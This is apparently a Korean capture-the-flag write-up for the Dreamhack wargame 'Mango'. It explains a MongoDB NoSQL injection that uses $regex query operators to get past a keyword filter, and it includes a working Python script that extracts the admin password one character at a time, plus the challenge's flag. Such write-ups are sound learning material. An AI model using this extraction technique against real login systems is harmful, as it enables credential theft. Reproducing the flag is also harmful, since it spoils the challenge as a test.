---
title : "드림핵 워게임 Mango"
tags : 
date : "2026-03-12"
bookmark :  true
---


# 문제설명
------------


```
이 문제는 데이터베이스에 저장된 플래그를 획득하는 문제입니다.
플래그는 admin 계정의 비밀번호 입니다.
플래그의 형식은 DH{...} 입니다.{'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
```

**페이지 화면**
![홈화면]({{ '/assets/img/mango_0.png' | relative_url }})




# 문제풀이
-------------

사이트에 접속하여 /login?uid=guest&upw=guest를 입력하면

![mango1]({{ '/assets/img/mango_1.png' | relative_url }})
화면에 guest가 출력된다.

그러면 /login?uid=admin&upw=admin 을 입력하게 되면,

![mango2]({{ '/assets/img/mango_2.png' | relative_url }})

filter가 뜬다. 왜 filter가 뜰까?

밑에 filter 함수를 살펴보면


&lt;filter 함수&gt;
```
// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
const BAN = ['admin', 'dh', 'admi'];
filter = function(data){
const dump = JSON.stringify(data).toLowerCase();
var flag = false;
BAN.forEach(function(word){
if(dump.indexOf(word)!=-1) flag = true;
});
return flag;
}
```

admin, dh, admi 이라는 값이 들어오게 되면 필터링 되도록 만들어놨다.

그러면 필터링에 안걸리게 우회해서 코드를 작성해야된다.

&lt;login 페이지 코드&gt;
```
http://localhost:3000/?data=1234
data: 1234
type: string


http://localhost:3000/?data[]=1234&data[]=5678
data: [ '1234', '5678' ]
type: object

http://localhost:3000/?data[5678]=1234
data: { '5678': '1234' }
type: object

const {uid, upw} = req.query; // 이용자가 전송한 uid, upw 입력값을 가져옴
db.collection('user').findOne({ // db에서 uid, upw로 검색
'uid': uid,
'upw': upw,
}

```


위의 login 페이지를 구성하는 코드를 보면 타입을 object로 받을 수 있고, 쿼리 변수 타입을 검사하지않는것을 볼 수 있다.

&lt;익스플로잇 코드&gt;
{% raw %}
```
1. import requests, string

2. HOST = 'http://host3.dreamhack.games:14803/'

3. ALPHANUMERIC = string.digits + string.ascii_letters

4. SUCCESS = 'admin'

5. flag = ''

6. for i in range(32):

7. for ch in ALPHANUMERIC:
8.    response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
9.   if response.text == SUCCESS:
10.       flag += ch
11.       break
12. print(f'FLAG: DH{{{flag}}}')
```
{% endraw %}

익스플로잇 코드를 살펴보면
3행: 반복문에 쓸 문자들을 모아놓았다. 숫자, 소문자, 대문자가 모두 들어가 있음.

5행 : 한글자씩 알아낸 비밀번호를 저장하는 변수
6행 : 플래그 길이를 32글자라고 예상하고 32번 반복하도록 함

7행: 알파벳과 숫자 후보들을 변수에 넣어 질문을 던질 준비를 함

8행: 핵심 코드.

{% raw %}
uid[$regex]=ad.in : filter함수를 우회하기 위해 .을 사용함.
upw[$regex]=D.{{{flag}{ch} :

D. : filter함수를 우회하기 위해 .을 이용하여 D.로 작성
{{ : {를 출력하기 위해선 두번 연속({{) 써야함.
{flag} : 찾아낸 비밀번호가 들어가는 변수
{ch} : 스무고개로 찔러볼 알파벳이 들어가는 변수
예를 들어 flag가 a고, ch가 b라고 한다면
http://localhost/login?uid[$regex]=ad.in&upw[$regex]=D.{ab

DB는 "아이디가 ad.in 패턴에 맞고, 비밀번호가 D,{ab 로 시작하는 유저가있나" 라고 해석하게 된다.

{% endraw %}

이제 VSCode를 열어서 실행해보자.

![mango3]({{ '/assets/img/mango_3.png' | relative_url }})

코드를 입력하고 실행하면,
(requests 설치 안되어있다면 터미널에서 pip install requests를 입력해서 설치한다.)

![mango4]({{ '/assets/img/mango_4.png' | relative_url }})

천천히 실행되면서 마지막에 DH값을 얻을 수 있다.

**정답 : DH{89e50fa6fafe2604e33c0ba05843d3df}**


